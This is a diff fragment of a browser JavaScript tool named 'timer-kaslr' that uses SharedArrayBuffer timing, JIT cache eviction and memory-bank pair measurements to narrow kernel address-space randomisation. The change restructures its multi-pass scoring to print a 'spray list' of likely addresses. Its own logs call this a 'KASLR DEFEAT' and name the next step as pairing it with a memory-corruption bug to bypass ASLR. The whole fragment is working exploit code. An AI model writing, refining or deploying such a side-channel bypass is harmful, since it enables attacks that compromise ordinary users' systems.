+  log(`[*] ASLR bits: 19  |  Leaked: ${entropyData.totalLeaked}  |  Remaining: ${remaining} bits = ${candidateCount} candidates`);
+  log(`[*] Confirmed pairs: ${confirmedPairs.length}  |  Tentative: ${tentativePairs.length}  |  Multi-anc confirmed: ${multiAnchorConfirmed}`);
+  log(`[*] HIGH-confidence: ${highConf.length}  |  Spray count: ${sprayHex.length}`);
+  log(`[*] Time to exhaust HIGH at 1ms/probe: ${(highConf.length/1000).toFixed(3)}s`);
+  log(`[!!!] NEXT STEP: pair with memory-corruption bug → use spray list as ASLR bypass layer`);
+  log(`[*] T10 === END ===`);
+
+  return {scores, sprayHex, highConf, confirmedPairs, tentativePairs};
 }
 
 // ─────────────────────────────────────────────────────────────
 // MAIN
 // ─────────────────────────────────────────────────────────────
 (async()=>{
-  log('// timer-kaslr-v16 ready (multi-run intersection)');
+  log('// timer-kaslr-v17 ready (fixed candidate space + accumulated bank evidence)');
   log(`${new Date().toISOString().substr(11,12)} === STARTING ===`);
   if(!self.SharedArrayBuffer){ log('[!] SAB unavailable'); return; }
 
@@ -529,106 +626,30 @@ function clusterMedians(medians){
   await new Promise(r=>setTimeout(r,30));
 
   const jitData=await t3();
-  if(!jitData){ log('[!] T3 failed — abort'); counterWorker.terminate(); return; }
+  if(!jitData){ log('[!] T3 failed'); counterWorker.terminate(); return; }
   await new Promise(r=>setTimeout(r,30));
 
-  // ─────────────────────────────────────────────────────────────
-  // Multi-run: 3 independent passes
-  // Each pass: fresh heap allocs → T4 → T5 → T7x → score
-  // ─────────────────────────────────────────────────────────────
-  const NUM_PASSES = 3;
-  const passResults = [];
+  // T4 once — establishes candidate space
+  const heapData=await t4();
+  await new Promise(r=>setTimeout(r,30));
 
+  // T6 once — FIXED candidate count for all scoring
+  const entropyData=t6(jitData,heapData);
+  await new Promise(r=>setTimeout(r,30));
+
+  // 3 bank collection passes using SAME heap bufs
+  const allPasses=[];
+  const NUM_PASSES=3;
   for(let p=0;p<NUM_PASSES;p++){
-    // Small delay between passes to let any GC settle
-    if(p>0) await new Promise(r=>setTimeout(r,200));
-    const res = await runPass(p, jitData.evictA, jitData);
-    passResults.push(res);
-    await new Promise(r=>setTimeout(r,50));
+    if(p>0) await new Promise(r=>setTimeout(r,150));
+    const passResult=await bankPass(p, heapData.bufs, jitData.evictA);
+    allPasses.push(passResult);
   }
 
-  // ─────────────────────────────────────────────────────────────
-  // INTERSECTION: candidates that appear HIGH in ALL passes
-  // ─────────────────────────────────────────────────────────────
-  log('\n─── INTERSECTION ───');
+  await new Promise(r=>setTimeout(r,30));
 
-  const candidateCount = passResults[0].candidateCount;
-  const remaining = passResults[0].remaining;
-
-  // Intersect HIGH sets across all passes
-  let intersection = new Set(passResults[0].highSet);
-  for(let p=1;p<NUM_PASSES;p++){
-    const other = passResults[p].highSet;
-    for(const c of intersection){
-      if(!other.has(c)) intersection.delete(c);
-    }
-  }
-
-  log(`[*] Pass HIGH set sizes: ${passResults.map(r=>r.highSet.size).join(', ')}`);
-  log(`[*] Intersection (ALL passes HIGH): ${intersection.size} candidates`);
-
-  // Weighted vote: sum scores across passes for ranking
-  const voteMap={};
-  for(let c=0;c<candidateCount;c++){
-    voteMap[c]=passResults.reduce((a,r)=>a+(r.scoredMap[c]||0),0);
-  }
-
-  // Sort intersection by total vote
-  const intersectArr=[...intersection].sort((a,b)=>voteMap[b]-voteMap[a]||a-b);
-
-  // If intersection is empty (can happen if runs diverge significantly),
-  // fall back: candidates HIGH in ≥2/3 passes
-  let finalSet=intersectArr;
-  if(intersection.size===0){
-    log(`[!] Empty intersection — falling back to ≥2/3 HIGH`);
-    const countMap={};
-    passResults.forEach(r=>{ r.highSet.forEach(c=>{ countMap[c]=(countMap[c]||0)+1; }); });
-    finalSet=Object.entries(countMap).filter(([,n])=>n>=2).map(([c])=>parseInt(c));
-    finalSet.sort((a,b)=>voteMap[b]-voteMap[a]||a-b);
-    log(`[*] Fallback ≥2/3 HIGH: ${finalSet.length} candidates`);
-  }
-
-  // If still empty, take top-20 by vote across all passes
-  if(finalSet.length===0){
-    log(`[!] Still empty — taking top-20 by vote sum`);
-    finalSet=Object.entries(voteMap).sort((a,b)=>b[1]-a[1]).slice(0,20).map(([c])=>parseInt(c));
-  }
-
-  // ─────────────────────────────────────────────────────────────
-  // Final output
-  // ─────────────────────────────────────────────────────────────
-  const PAGE_SIZE=16384;
-  const sprayAddresses=finalSet.map(c=>c*PAGE_SIZE);
-  sprayAddresses.sort((a,b)=>a-b);
-
-  // Fill small gaps (single missing page between two present ones)
-  const sprayFilled=[...sprayAddresses];
-  for(let i=0;i<sprayAddresses.length-1;i++){
-    if(sprayAddresses[i+1]-sprayAddresses[i]===2*PAGE_SIZE)
-      sprayFilled.push(sprayAddresses[i]+PAGE_SIZE);
-  }
-  sprayFilled.sort((a,b)=>a-b);
-  const sprayHex=sprayFilled.map(v=>`0x${v.toString(16).toUpperCase().padStart(8,'0')}`);
-
-  log(`\n[*] === KASLR DEFEAT SUMMARY (v16) ===`);
-  log(`[*] ASLR bits: 19  |  Leaked: ${passResults[0].totalLeaked}  |  Remaining: ${remaining} bits = ${candidateCount} candidates`);
-  log(`[*] Passes: ${NUM_PASSES}  |  Per-pass HIGH: ${passResults.map(r=>r.highSet.size).join('/')}`);
-  log(`[*] Intersection HIGH: ${intersection.size}  |  Final spray count: ${sprayFilled.length}`);
-  log(`[*] Bank pairs per pass: ${passResults.map(r=>r.pairCount).join('/')}`);
-  log(`[*] Time to exhaust at 1ms/probe: ${(sprayFilled.length/1000).toFixed(3)}s`);
-
-  if(sprayFilled.length<=32){
-    log(`[!!!] FINAL SPRAY LIST (${sprayFilled.length} addresses):`);
-    for(let i=0;i<sprayHex.length;i+=8)
-      log(`[!!!]   ${sprayHex.slice(i,i+8).join('  ')}`);
-  } else {
-    log(`[!!!] SPRAY TARGET LIST (${sprayHex.length} addresses):`);
-    for(let i=0;i<sprayHex.length;i+=8)
-      log(`[!!!]   ${sprayHex.slice(i,i+8).join('  ')}`);
-  }
-
-  log(`[!!!] NEXT STEP: pair with memory-corruption bug → use spray list as ASLR bypass layer`);
-  log(`[*] === END ===`);
+  // T10: score using accumulated evidence
+  await t10(jitData, heapData, allPasses, entropyData);
 
   counterWorker.terminate();
 
